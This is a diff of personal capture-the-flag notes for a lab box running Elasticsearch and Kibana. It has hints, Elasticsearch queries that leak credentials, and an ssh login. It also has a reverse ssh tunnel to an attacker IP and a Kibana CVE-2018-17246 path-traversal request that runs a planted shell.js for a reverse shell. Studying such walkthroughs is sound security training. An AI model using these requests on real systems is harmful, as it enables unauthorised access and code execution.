@@ -15,6 +15,61 @@ PORT     STATE SERVICE VERSION
 |_http-server-header: nginx/1.12.2
 |_http-title: Site doesn't have a title (application/json; charset=UTF-8).
 
+----------------------------------------
+
+hints:
+
+Port 80 isn't worthless, ie hints there
+ELK stack
+database of some kind
+elastic search
+something about the image of the needle
+    when find something interesting search on port 9200
+spanish ?
+access a server, trigger a vulnerability, try using a debugger
+
+for root
+local service, see services running as root for changes
+pivot from initial shell to another user
+whats on the box -> documented -> vuln/exploit
+see whats running as root
+enumerate what you're allowed to do -> configs
+the higher port/service works as a db and may contains something useful.
+
+HTTP requesting:
+trying to use the GET with elastic search to query database
+
+User: google translate is your friend, but dont rely it too much, sometimes you do not need it.
+This part is like CTF ish, so go ahead to process the image, unload the hint and use bit of brain power on the hint.
+
+Root:
+there are 2 more steps to root after you gain access to the user part.
+The CVE is not really the CVE exploitable thing, it just tells you the vulnerability,
+go back to square one if needed and to regain access to the server.
+Once success, look for some build in features that cause the vulnerability and keep testing it,
+if necessary, use some online debugger tools to debug it, it can save you some great amount of time.
+
+make a quick googling on what that high port is used for. find the applications name and google how to talk to it. it is well documented.
+when you´ve found some document, try to find how you can extract data from it. it will have something called _x...... thats what you want to utilize to make your query.
+you will need to SELECT right command with _x..../s..
+
+User: the higher service works as a db and may contains something useful. Important things does not require too many words.
+
+root: this is a two step process. You need to become someone else before that you would be able to get the highest privs. Maybe something else. Check procs and owners.
+To get root stay simple. Check what you can do, what you can read and how to bypass that filter. There is a giant rabbit hole, if something does not work, it will not work even if you will wait.
+One last thing, it needs to be triggered.
+
+The part of the root requires to see these 3 files that are in a folder and see their contents,
+when looking in the documentation of l******h saw that there is an online Debugger to see the pattern and be sure of what you do
+And finally it is required to run the event
+
+If you just got user.txt you will need to become another user before root.
+Your enumeration as that new user should point you the right path on the system.
+
+For everybody: Change file names when trying to get the final step to root running!
+It cost me hours to realize that modifying the same file over and over will not trigger execution...
+
+----------------------------------------
 
 10.10.10.115:80
 
@@ -40,61 +95,7 @@ needle.jpg
   "tagline" : "You Know, for Search"
 }
 
---------------------
-
-hints:
-
-Port 80 isn't worthless, ie hints there
-ELK stack
-database of some kind
-elastic search
-something about the image of the needle
-    when find something interesting search on port 9200
-spanish ?
-access a server, trigger a vulnerability, try using a debugger
-
-for root
-local service, see services running as root for changes
-pivot from initial shell to another user
-whats on the box -> documented -> vuln/exploit
-see whats running as root
-enumerate what you're allowed to do -> configs
-the higher port/service works as a db and may contains something useful.
-
-HTTP requesting:
-trying to use the GET with elastic search to query database
-
-
-User: google translate is your friend, but dont rely it too much, sometimes you do not need it.
-This part is like CTF ish, so go ahead to process the image, unload the hint and use bit of brain power on the hint.
-
-Root:
-there are 2 more steps to root after you gain access to the user part.
-The CVE is not really the CVE exploitable thing, it just tells you the vulnerability,
-go back to square one if needed and to regain access to the server.
-Once success, look for some build in features that cause the vulnerability and keep testing it,
-if necessary, use some online debugger tools to debug it, it can save you some great amount of time.
-
-make a quick googling on what that high port is used for. find the applications name and google how to talk to it. it is well documented.
-when you´ve found some document, try to find how you can extract data from it. it will have something called _x...... thats what you want to utilize to make your query.
-you will need to SELECT right command with _x..../s..
-
-User: the higher service works as a db and may contains something useful. Important things does not require too many words.
-
-root: this is a two step process. You need to become someone else before that you would be able to get the highest privs. Maybe something else. Check procs and owners.
-To get root stay simple. Check what you can do, what you can read and how to bypass that filter. There is a giant rabbit hole, if something does not work, it will not work even if you will wait.
-One last thing, it needs to be triggered.
-
-The part of the root requires to see these 3 files that are in a folder and see their contents, when looking in the documentation of l******h saw that there is an online Debugger to see the pattern and be sure of what you do
-And finally it is required to run the event
-
-If you just got user.txt you will need to become another user before root.
-Your enumeration as that new user should point you the right path on the system.
-
-For everybody: Change file names when trying to get the final step to root running!
-It cost me hours to realize that modifying the same file over and over will not trigger execution...
-
---------------------
+----------------------------------------
 
 in the needle.jpg
 
@@ -106,10 +107,20 @@ la aguja en el pajar es "clave"
 
 the needle in the haystack is "key"
 
---------------------
+----------------------------------------
 
-use elastic search
+ELASTIC SEARCH
 
+list indices:
+
+GET http://10.10.10.115:9200/_cat/indices?v
+
+health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
+green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
+yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
+yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
+
+input a query:
 GET 10.10.10.115:9200/_search?q=
 
 search: clave
@@ -142,22 +153,13 @@ user: security
 cGFzczogc3BhbmlzaC5pcy5rZXk=
 pass: spanish.is.key
 
+ssh security@10.10.10.115
 
-list indices:
+----------------------------------------
 
-GET http://10.10.10.115:9200/_cat/indices?v
+KIBANA
 
-health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
-yellow open   test    -81MYWe-S0e9sTvDb50ApQ   5   1          0            0      1.2kb          1.2kb
-yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
-yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
-yellow open   test2   s52fefKTQ9-qCffTbFXmig   5   1          0            0      1.2kb          1.2kb
-green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
-
---------------------
-
-Maybe have to switch user from security to kibana
-
+have to switch user from security to kibana
 
 possible security flaw
 
@@ -166,3 +168,35 @@ CVE-2018-17246	77		Exec Code File Inclusion	2018-12-20	2019-01-08	7.5	None	Remot
 Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin.
 An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code.
 This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.
+
+
+ssh into box as security
+
+cat /etc/kibana/kibana.yml
+
+get a reverse ssh back
+ssh -R 5601:127.0.0.1:5601 guest@10.10.14.163
+
+go to kibana from local host
+http://127.0.0.1:5601/app/kibana#/home?_g=()
+
+kibana cve
+https://github.com/mpgn/CVE-2018-17246
+
+put shell in tmp
+
+/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../path/to/shell.js
+
+trigger vulnerability
+http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../tmp/s.js
+
+now have reverse shell as kibana
+
+uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
+
+----------------------------------------
+
+LOGSTASH
+
+/etc/logstash/conf.d
+
